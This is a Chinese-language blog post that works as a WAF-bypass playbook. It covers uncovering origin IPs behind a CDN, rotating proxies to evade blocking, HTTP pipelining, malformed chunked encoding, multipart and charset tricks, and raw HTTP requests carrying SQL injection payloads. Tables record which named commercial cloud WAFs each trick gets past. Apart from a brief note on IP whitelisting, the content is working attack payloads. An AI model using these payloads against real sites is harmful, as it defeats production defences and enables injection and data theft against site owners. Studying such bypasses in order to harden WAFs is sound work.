+<h2 id="一、架构层面"><a href="#一、架构层面" class="headerlink" title="一、架构层面"></a>一、架构层面</h2><h3 id="1-串联"><a href="#1-串联" class="headerlink" title="1. 串联"></a>1. 串联</h3><p><strong>a. WAF与后端业务的理解不同</strong></p>
+<p>串联架构的ByPass测试需找寻WAF与中间件、后端业务间的耦合性缺漏（比如下一小节协议/中间件层面的问题）。</p>
+<p><strong>b. 绕过CDN（云WAF特有）</strong></p>
+<p><strong>原理：</strong></p>
+<p>如果流量没有经过WAF，WAF即无法拦截攻击请求。当前多数云WAF架构，通过更改DNS解析，把流量引入WAF集群，流量经过检测后转发请求到源站。</p>
+<p><strong>关于部署了CDN源站的一点小知识</strong></p>
+<p><strong>部署CDN的常见问题：</strong></p>
+<ul>
+<li>未更换IP，通过域名解析历史记录很快找到。</li>
+<li>未限制IP直接访问，网络空间搜索引擎轻易找到。</li>
+</ul>
+<p><strong>伪防御：</strong></p>
+<ul>
+<li>通过中间件配置只允许域名访问，禁止ip直接访问。</li>
+</ul>
+<p><strong>防御绕过：</strong></p>
+<ul>
+<li><p>通过修改本地hosts文件，手动绑定域名IP直接解析绕过CDN</p>
+</li>
+<li><p>或者BurpSuite请求指向IP地址，修改host请求头为域名</p>
+</li>
+</ul>
+<p><strong>真防御：</strong></p>
+<p>限制白名单访问</p>
+<ol>
+<li><p>通过中间件或者SLB（负载均衡）前的云防火墙配置IP访问白名单，设置仅CDN回源节点能够访问。但是CDN回源节点不是固定的，所以要调用CDN厂商接口获得节点IP列表再加入白名单。</p>
+</li>
+<li><p>配置SLB的ACL，把WAF回源网段加入白名单，CDN回源到了WAF所以不用在乎CDN节点，一劳永逸。</p>
+</li>
+</ol>
+<p>如果目标站点没有按照最后的防御方法进行配置，那么找到真实IP实现CDN绕过只是时间问题。</p>
+<p><strong>寻找真实IP一般情况下用的比较多的方法:</strong></p>
+<ul>
+<li>DNS解析记录</li>
+<li>Banner识别</li>
+<li>企业/单位分配的固定IP段</li>
+<li>邮件服务器IP或者子域名未加CDN，查找子域名的C段</li>
+</ul>
+<p><strong>终极方法：</strong></p>
+<ul>
+<li>全网IP匹配域名扫描</li>
+</ul>
+<blockquote>
+<p>寻找真实IP的方法非常多，针对不同的系统功能有对应合适的方法寻找，网上公开的总结很多，这里就不一一列举了。</p>
+</blockquote>
+<p><strong>c. 利用边界漏洞</strong></p>
+<p>如果未能发现源站IP，还可以尝试寻找子站的SSRF漏洞。如果子站访问目标站不经过WAF集群，可以利用SSRF漏洞来绕过WAF。</p>
+<h3 id="2-旁路"><a href="#2-旁路" class="headerlink" title="2. 旁路"></a>2. 旁路</h3><p><strong>a. WAF与后端业务的理解不同</strong></p>
+<p>和串联一样，此类方法同样有效。</p>
+<p><strong>b. 阻断执行时间差</strong></p>
+<p>通过攻击测试，很容易判断出旁路WAF同阻断组件的通联时间，获取海量且廉价的代理IP，控制好单IP的测试存活时间，较低成本便可绕过；</p>
+<h2 id="二、协议-中间件层面"><a href="#二、协议-中间件层面" class="headerlink" title="二、协议/中间件层面"></a>二、协议/中间件层面</h2><blockquote>
+<p>适用于非嵌入式的WAF</p>
+</blockquote>
+<p>即使流量都确保经过WAF，如果WAF的防御策略根本就没有检测payload，那么也就能绕过WAF。</p>
+<p>可以利用（WAF/后端WEB服务器/语言解析引擎）对HTTP协议解析的差异来绕过WAF。</p>
+<h3 id="1-Keep-alive-Pipelining"><a href="#1-Keep-alive-Pipelining" class="headerlink" title="1. Keep-alive+Pipelining"></a>1. Keep-alive+Pipelining</h3><p><strong>限制条件：</strong></p>
+<ul>
+<li>本地测试仅Apache+php_ts(线程安全版本)支持多个回显</li>
+<li>但是一般中间件都会接受所有请求，意味着命令执行、文件上传等不需要回显的请求都是ok的</li>
+<li>可以结合OOB外带、HTTP请求走私等</li>
+</ul>
+<blockquote>
+<p>引用维基百科：HTTP 管线化同时依赖于客户端和服务器的支持。遵守 HTTP/1.1 的服务器支持管线化。这并不是意味着服务器需要提供管线化的回复，而只是要求在收到管线化的请求时候不会失败。</p>
+</blockquote>
+<p><strong>原理：</strong></p>
+<p>HTTP管道化允许多个HTTP请求通过一个套接字同时被输出 ，而不用等待相应的响应。然后请求者就会等待各自的响应，这些响应是按照之前请求的顺序依次到达。因为多个请求可被同时传送，如果WAF只检测第一个请求，而忽略后面的请求，便可被绕过。</p>
+<p><strong>同时还可以绕过WAF的访问控制、虚拟补丁等（HTTP请求走私同样可以绕过）</strong></p>
+<p><strong>步骤：</strong></p>
+<ol>
+<li><p>关闭burp的Repeater的Content-Length自动更新，Repeater在下拉选项中取消update Content-Length选中。</p>
+</li>
+<li><p>完整复制一份在当前最后一个字符后面。</p>
+</li>
+<li><p>将数据包的Content-Length的值还原回前面的长度，最后将Connection字段值设为keep-alive。提交后会返回两个响应包，分别对应两个请求。</p>
+<p>例1：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sqli-labs/Less-2/</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"></span><br><span class="line">xx=union select user(),2,3GET /sqli-labs/Less-2/?id=1 HTTP/1.0</span><br><span class="line"><span class="attribute">Host</span>: 192.168.10.4</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line">(CR LF)</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>   例2：</p>
+   <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/sqli-labs/Less-2/?id=1</span> HTTP/1.0</span><br><span class="line">   <span class="attribute">Host</span>: 192.168.10.4</span><br><span class="line">   <span class="attribute">Connection</span>: keep-alive</span><br><span class="line">   </span><br><span class="line">   POST /sqli-labs/Less-2/ HTTP/1.1</span><br><span class="line">   <span class="attribute">Connection</span>: close</span><br><span class="line">   </span><br><span class="line">   xx=union select user(),2,3</span><br><span class="line">   (CR LF)</span><br></pre></td></tr></table></figure>
+<p>   例3：(HTTP 0.9)</p>
+   <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sqli-labs/Less-2/</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Connection</span>: keep-alive</span><br><span class="line"><span class="attribute">Content-Length</span>: 26</span><br><span class="line"></span><br><span class="line">xx=union select user(),2,3GET /sqli-labs/Less-2/?id=1</span><br><span class="line">(CR LF)</span><br></pre></td></tr></table></figure>
+<p><strong>注意：</strong>本地环境测试时，当php版本为<code>nts</code>时，服务端只返回一个响应，<code>ts</code>版本是ok的。</p>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>百度云/cloudflare</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✔</td>
+</tr>
+</tbody>
+</table>
+<h3 id="2-分块传输"><a href="#2-分块传输" class="headerlink" title="2. 分块传输"></a>2. 分块传输</h3><p><strong>条件：</strong></p>
+<ul>
+<li>常见中间件均支持此方式（Apache、Nginx、Tomcat）</li>
+</ul>
+<p><strong>原理：</strong></p>
+<p>通过在数据包中添加<code>Transfer-Encoding: chunked</code>,标示报文采用分块编码。此时会忽略<code>Content-Length</code>字段设置。<br>此时数据部分为一系列分块，每个分块包含十六进制的长度值和数据，长度值与数据各占一行。最后用<code>0</code>标志分块结束并且最后紧跟两个换行。</p>
+<h4 id="正常分块"><a href="#正常分块" class="headerlink" title="正常分块"></a>正常分块</h4><blockquote>
+<p>正常+注释的方法一般都不能绕过了</p>
+</blockquote>
+<p>使用BurpSuite的chuncked插件比较方便</p>
+<p><strong>测试：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✘=&gt;✔(guanjia)、✘(cloud)</td>
+</tr>
+<tr>
+<td>百度云/cloudflare</td>
+<td>✔=&gt;✘</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✘</td>
+</tr>
+</tbody>
+</table>
+<p>京东云交过src还可以🐂🍺</p>
+<h4 id="畸形分块"><a href="#畸形分块" class="headerlink" title="畸形分块"></a>畸形分块</h4><p><strong>1. 去掉最后的0</strong></p>
+<p><strong>条件：</strong></p>
+<p>适用于容错性较高的中间件，比如Apache，返回400但是可以成功执行</p>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>百度云/cloudflare</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✔</td>
+</tr>
+</tbody>
+</table>
+<p><strong>2. 添加空格或者TAB</strong></p>
+<p><strong>条件：</strong></p>
+<p>仅Apache支持解析</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding :chunked</span><br><span class="line">Transfer-Encoding	:chunked</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔(edu)✘(yq)</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>百度云/cloudflare</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✘=&gt;✔</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✔</td>
+</tr>
+</tbody>
+</table>
+<p><strong>3. 多加一些字符，导致报错</strong></p>
+<p><strong>条件：</strong></p>
+<p>Nginx正常解析</p>
+<p>php(nts)+Apache、Tomcat正常但不解析</p>
+<p>php(ts)+Apache会直接400报错</p>
+<p><strong>原理：</strong></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/sql.php?id=2%20union</span> HTTP/1.1</span><br><span class="line">......</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"></span><br><span class="line"><span class="attribute">1</span></span><br><span class="line"><span class="attribute">aa</span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute">(CRLF)</span></span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<blockquote>
+<p>也适用于报错即不处理的WAF</p>
+</blockquote>
+<p>云WAF基本不行，软WAF可以尝试</p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✘=&gt;✔(guanjia)、✘(cloud)</td>
+</tr>
+<tr>
+<td>百度云/cloudflare</td>
+<td>✔=&gt;✘</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✘</td>
+</tr>
+</tbody>
+</table>
+<p><strong>4. chunked添加混淆</strong></p>
+<p><strong>条件：</strong></p>
+<ul>
+<li>Apache支持解析</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding: xxx chunked</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔=&gt;✘</td>
+</tr>
+<tr>
+<td>百度云/Cloudflare</td>
+<td>✘=&gt;✔</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✔</td>
+</tr>
+</tbody>
+</table>
+<h4 id="分块欺骗"><a href="#分块欺骗" class="headerlink" title="分块欺骗"></a>分块欺骗</h4><p><strong>条件：</strong></p>
+<ul>
+<li>Tomcat会忽略畸形的分块头</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Transfer-Encoding%00: chunked	#urldecode下</span><br><span class="line">Transfer-Encoding\00: chunked</span><br></pre></td></tr></table></figure>
+<p>如果存在中间件忽略正常（或者畸形）的分块请求头且WAF会认真识别的情况，可以尝试</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1:8081</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 72</span><br><span class="line"><span class="attribute">Transfer-Encoding\00</span>: chunked</span><br><span class="line"></span><br><span class="line">3;&amp;xx=-1 union select user()</span><br><span class="line"><span class="attribute">foo</span></span><br><span class="line"><span class="attribute">0</span></span><br><span class="line"><span class="attribute">(CRLF)</span></span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>百度云</td>
+<td>✘=&gt;✔</td>
+</tr>
+<tr>
+<td>Cloudflare</td>
+<td>✔ + (\00)</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✔</td>
+</tr>
+</tbody>
+</table>
+<p>其他一些混淆格式</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Transfer-Encoding</span>: xchunked</span><br><span class="line"><span class="attribute">Transfer-Encoding[空格]</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>: x</span><br><span class="line"><span class="attribute">Transfer-Encoding:[tab]chunked</span></span><br><span class="line"><span class="attribute">[空格]Transfer-Encoding</span>: chunked</span><br><span class="line"><span class="attribute">X</span>: X[\n]Transfer-Encoding: chunked</span><br><span class="line"><span class="attribute">Transfer-Encoding</span></span><br><span class="line"><span class="attribute"></span>: chunked</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/bad-lucifer/HTTP-Request-Smuggling-Checker/blob/master/HTTP-Request-Smuggling-Checker.py</span><br><span class="line">[&quot;Transfer-Encoding:chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding :chunked&quot;],</span><br><span class="line">[&quot;Transfer_Encoding:chunked&quot;],</span><br><span class="line">[&quot;Transfer Encoding:chunked&quot;],</span><br><span class="line">[&quot; Transfer-Encoding:chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:  chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:\tchunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:\u000Bchunked&quot;],</span><br><span class="line">[&quot;Content-Encoding: chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding:\n chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding\n : chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: \&quot;chunked\&quot;&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: &apos;chunked&apos;&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: \n\u000Bchunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: \n\tchunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunked, cow&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: cow, &quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunked\r\nTransfer-encoding: cow&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunk&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: cHuNkeD&quot;],</span><br><span class="line">[&quot;TrAnSFer-EnCODinG: cHuNkeD&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: CHUNKED&quot;],</span><br><span class="line">[&quot;TRANSFER-ENCODING: CHUNKED&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunked\r&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: chunked\t&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: cow\r\nTransfer-Encoding: chunked&quot;],</span><br><span class="line">[&quot;Transfer-Encoding: cow\r\nTransfer-Encoding: chunked&quot;],</span><br><span class="line">[&quot;Transfer\r-Encoding: chunked&quot;],</span><br><span class="line">[&quot;barn\n\nTransfer-Encoding: chunked&quot;]</span><br></pre></td></tr></table></figure>
+<h3 id="3-Content-Type编码"><a href="#3-Content-Type编码" class="headerlink" title="3. Content-Type编码"></a>3. Content-Type编码</h3><p><strong>条件：</strong></p>
+<blockquote>
+<p>WAF针对该方式进行内容识别时才可能会绕过，如果是整个POST包的匹配就没戏了</p>
+<p>目前云WAF基本都是整包识别</p>
+</blockquote>
+<h4 id="正常协议"><a href="#正常协议" class="headerlink" title="正常协议"></a>正常协议</h4><blockquote>
+<p>还可以在这里面进行规则绕过，如果这里规则不一样的话可以尝试</p>
+</blockquote>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=8</span><br><span class="line"><span class="attribute">Content-Length</span>: 71</span><br><span class="line"></span><br><span class="line">--8</span><br><span class="line"><span class="attribute">Content-Disposition</span>: name="id"</span><br><span class="line"></span><br><span class="line">-1 union all select 1,2,3</span><br><span class="line">--8--</span><br></pre></td></tr></table></figure>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>百度云</td>
+<td>✔=&gt;✘</td>
+</tr>
+<tr>
+<td>cloudflare</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✘</td>
+</tr>
+</tbody>
+</table>
+<h4 id="结合分块传输"><a href="#结合分块传输" class="headerlink" title="结合分块传输"></a>结合分块传输</h4><p><strong>条件：</strong></p>
+<p>各中间件均支持</p>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔(edu)=&gt;✘</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔(guanjia)✘(cloud)</td>
+</tr>
+<tr>
+<td>百度云</td>
+<td>✔=&gt;✘</td>
+</tr>
+<tr>
+<td>Cloudflare</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✘</td>
+</tr>
+</tbody>
+</table>
+<h4 id="畸形协议"><a href="#畸形协议" class="headerlink" title="畸形协议"></a>畸形协议</h4><p><strong>条件：</strong></p>
+<p>测试此方法的前提首先要确定WAF正确识别该形式的内容，而不是对整个POST包的检测</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; boundary=0000; boundary=1111</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-dataX boundary=0000</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/; boundary=8</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/whatever; boundary=8</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data;boundary=0000'1111</span><br></pre></td></tr></table></figure>
+<p>参数欺骗</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name="n1"; name="n2"</span><br><span class="line"><span class="attribute">Content-Disposition</span>: form-data; name=';filename="';name=payload;"</span><br></pre></td></tr></table></figure>
+<h3 id="4-SSL加密算法不支持"><a href="#4-SSL加密算法不支持" class="headerlink" title="4. SSL加密算法不支持"></a>4. SSL加密算法不支持</h3><p><strong>原理：</strong></p>
+<p>对于非嵌入型WAF，在解析SSL数据时，需要该SSL通信端服务器的密钥（非对称）。客户端在与Web服务器进行HTTPS通信时，协商SSL的加密方式可以有很多种，选择一种WAF无法识别但Web服务器可以识别的加密方式来绕过WAF检测。</p>
+<p><strong>条件：</strong></p>
+<p>HTTPS支持指定密钥</p>
+<p><strong>步骤：</strong></p>
+<p>相关工具见Github：</p>
+<p><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a></p>
+<p><a href="https://github.com/LandGrey/abuse-ssl-bypass-waf" target="_blank" rel="noopener">https://github.com/LandGrey/abuse-ssl-bypass-waf</a></p>
+<p><strong>测试结果：</strong></p>
+<p>待测试</p>
+<h3 id="5-报错绕过"><a href="#5-报错绕过" class="headerlink" title="5. 报错绕过"></a>5. 报错绕过</h3><p>构造其他畸形请求让WAF解析报错，不再检测，但后端服务器仍支持解析</p>
+<p><strong>条件：</strong></p>
+<p>不同中间件的解析差异</p>
+<p><strong>测试结果：</strong></p>
+<p>根据具体请求和具体WAF，来具体分析</p>
+<h4 id="xxx-as-GET"><a href="#xxx-as-GET" class="headerlink" title="xxx as GET"></a>xxx as GET</h4><p>影响范围：apache+php GET方式</p>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>百度云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>cloudflare</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✘</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✘</td>
+</tr>
+</tbody>
+</table>
+<h4 id="TAB-as-SPACE"><a href="#TAB-as-SPACE" class="headerlink" title="TAB as SPACE"></a>TAB as SPACE</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST	/?page_id=-15 HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p><strong>条件：</strong></p>
+<p>Apache</p>
+<p><strong>测试结果：</strong></p>
+<table>
+<thead>
+<tr>
+<th>WAF产品</th>
+<th>测试结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>阿里云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>腾讯云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>百度云/cloudflare</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>创宇盾</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>京东云</td>
+<td>✔</td>
+</tr>
+<tr>
+<td>奇安信</td>
+<td>✔</td>
+</tr>
+</tbody>
+</table>
+<h4 id="参数空格"><a href="#参数空格" class="headerlink" title="参数空格"></a>参数空格</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /xxx/a.jsp?x= &amp;id=union%20all%20select%20@@version HTTP/1.1</span><br></pre></td></tr></table></figure>
+<p>将HTTP原始数据包的<code>&quot;x=&quot;</code>后面设置为空格，某些硬件WAF就会忽略后面的<code>&amp;id=union%20all%20select%20@@version</code>参数从而绕过WAF。</p>
+<p><strong>条件：</strong></p>
+<p>Tomcat</p>
+<p><strong>测试结果：</strong></p>
+<p>云WAF全✘</p>
+<h4 id="GET-POST"><a href="#GET-POST" class="headerlink" title="GET+POST"></a><strong>GET+POST</strong></h4><blockquote>
+<p>代码逻辑角度</p>
+</blockquote>
+<p>当同时提交 GET、POST 请求时，进入 POST 逻辑，而忽略了 GET 请求的有害参数输入,可轻易 Bypass</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/test.php?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</span><br><span class="line">[POST]</span><br><span class="line">aaa</span><br></pre></td></tr></table></figure>
+<p><strong>条件：</strong></p>
+<p>某种WAF。。</p>
+<p><strong>测试结果：</strong></p>
+<p>云WAF全✘</p>
+<h3 id="6-Charset编码"><a href="#6-Charset编码" class="headerlink" title="6. Charset编码"></a>6. Charset编码</h3><blockquote>
+<p>理论上很多WAF都无法识别，但是实际可以操作的环境极少，ASP.NET可能ok</p>
+<p>可能因为中间件和框架过滤器一般都会设置UTF-8作为默认解码/编码参数，导致无法利用</p>
+</blockquote>
+<p>HTTP请求头<code>Content-Type</code>的<code>charset</code>编码可以指定内容编码，这个值一般都是UTF-8编码的，但恶意攻击者可以指定使用<code>ibm037</code>、<code>ibm500</code>、<code>cp875</code>、<code>ibm1026</code>等不常用的编码来进行绕过。</p>
+<p>Content-Type头中使用charset定义字符集的应用场景不只有在responses中，request中同样可以使用，而变换http字符编码集以后，基于规则引擎的WAF则彻底失控：</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded; charset=ibm500</span><br><span class="line"><span class="attribute">Content-Type</span>: multipart/form-data; charset=ibm500,boundary=8</span><br><span class="line"></span><br><span class="line">%60%F1%40%A4%95%89%96%95%40%A2%85%93%85%83%A3%40%F1k%F2k%F3</span><br></pre></td></tr></table></figure>
+<p><img src="/2020/05/20/WAF普及篇/image-20200506213900756.png" alt="image-20200506213900756"></p>
